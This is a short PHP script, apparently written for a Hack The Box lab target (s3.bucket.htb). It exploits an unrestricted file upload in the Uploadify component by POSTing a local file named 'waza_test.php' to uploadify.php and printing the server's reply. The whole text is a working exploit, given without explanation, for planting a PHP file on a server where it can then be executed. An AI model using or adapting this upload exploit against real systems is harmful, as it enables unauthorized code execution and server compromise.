<?php

$uploadfile="waza_test.php";

$ch = curl_init("http://s3.bucket.htb/adserver/files/uploadify/uploadify.php?folder=/files/uploadify/");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
   
print "$postResult";

?>